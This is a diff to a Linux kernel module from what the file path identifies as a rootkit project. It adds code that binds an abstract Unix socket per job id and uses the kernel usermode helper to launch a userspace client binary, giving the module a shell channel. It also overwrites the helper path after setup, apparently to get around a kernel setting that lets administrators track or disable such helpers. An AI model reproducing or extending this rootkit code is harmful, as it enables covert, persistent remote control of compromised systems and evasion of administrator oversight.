@@ -3,6 +3,7 @@
 #include <linux/init.h>
 #include <linux/socket.h>
 #include <linux/net.h>
+#include <linux/umh.h>
 #include <linux/un.h>
 #include <net/net_namespace.h>
 #include <net/sock.h>
@@ -10,10 +11,12 @@
 #include "headers/networking.h"
 #include "headers/shell.h"
 
-#define SOCK_PATH ("\0test-file2")
-#define SOCK_PATH_LEN (sizeof(SOCK_PATH))
+#define USERMODE_HELPER_PATH ("/home/yanayg/MyRootkit/usermode/client")
 #define SOCK_DEV_MTU (2048)
 #define DELAY_JIFFIES (2)
+
+#define SOCK_PATH_PREFIX ("shell-sock-")
+#define SOCK_PATH_JOB_ID_LEN (6)
 
 // According to the following post
 // https://stackoverflow.com/questions/19937598/linux-kernel-module-unix-domain-sockets
@@ -29,6 +32,61 @@ struct stream_data {
     struct delayed_work work;
     struct open_stream *st;
 };
+
+static int job_t_to_str(char *buffer, int len, job_id_t job_id) {
+    int i;
+    for (i = 0; i < len; i++) {
+        buffer[len - i - 1] = '0' + job_id % 10;
+        job_id /= 10;
+    }
+    return job_id;
+}
+
+static int fill_sock_path(char *buffer, int len, job_id_t job_id) {
+    if (len < sizeof(SOCK_PATH_PREFIX) + SOCK_PATH_JOB_ID_LEN) return 1;
+    memset(buffer, 0, len);
+    memcpy(buffer, SOCK_PATH_PREFIX,  sizeof(SOCK_PATH_PREFIX));
+    return job_t_to_str(buffer + sizeof(SOCK_PATH_PREFIX) - 1, len - sizeof(SOCK_PATH_PREFIX), job_id);
+}
+
+static int fill_sock_addr(struct safe_sockaddr_un *saddr, job_id_t job_id) {
+    BUILD_BUG_ON(1 + sizeof(SOCK_PATH_PREFIX) + SOCK_PATH_JOB_ID_LEN > sizeof(saddr->addr.sun_path));
+
+    memset(saddr, 0, sizeof(*saddr));
+    saddr->addr.sun_family = AF_UNIX;
+    return fill_sock_path(saddr->addr.sun_path + 1, sizeof(SOCK_PATH_PREFIX) + SOCK_PATH_JOB_ID_LEN, job_id);
+}
+
+static int start_usermode_shell(job_id_t job_id) {
+    int err;
+    struct subprocess_info *info;
+    char sock_path[sizeof(SOCK_PATH_PREFIX) + SOCK_PATH_JOB_ID_LEN];
+    char *argv[] = { USERMODE_HELPER_PATH, sock_path, NULL };
+    static char *envp[] = {
+		"HOME=/",
+		"TERM=linux",
+		"PATH=/sbin:/usr/sbin:/bin:/usr/bin",
+		NULL
+	};
+
+    fill_sock_path(sock_path, sizeof(SOCK_PATH_PREFIX) + SOCK_PATH_JOB_ID_LEN, job_id);
+
+    info = call_usermodehelper_setup(
+        USERMODE_HELPER_PATH, 
+        argv, 
+        envp,
+        GFP_KERNEL,
+        NULL, 
+        NULL, 
+        NULL
+    );
+
+    // This value can be overriden in `call_usermodehelper_setup` by setting CONFIG_STATIC_USERMODEHELPER_PATH,
+    // this means the helpers can be tracked or disabled.
+    info->path = USERMODE_HELPER_PATH;
+
+    return call_usermodehelper_exec(info, UMH_KILLABLE);
+}
 
 static void poll_shell_work(struct work_struct *work) {
     struct stream_data *data = container_of(to_delayed_work(work), struct stream_data, work);
@@ -76,9 +134,7 @@ int open_shell(struct open_stream *st) {
         return 1;
     }
 
-    memset(&saddr, 0, sizeof(saddr));
-    saddr.addr.sun_family = AF_UNIX;
-    memcpy(saddr.addr.sun_path, SOCK_PATH,  min(SOCK_PATH_LEN, sizeof(saddr.addr.sun_path) - 1));
+    fill_sock_addr(&saddr, st->origin.job_id);
     
     if ((res = kernel_bind(srvsock, (struct sockaddr *)&saddr.addr, sizeof(saddr.addr)))) {
         printk(KERN_INFO "Couldn't bind to addr\n");
@@ -87,6 +143,10 @@ int open_shell(struct open_stream *st) {
     printk(KERN_INFO "Bound to addr\n");
 
     if ((res = kernel_listen(srvsock, 1))) {
+        goto done;
+    }
+
+    if ((res = start_usermode_shell(st->origin.job_id))) {
         goto done;
     }
 
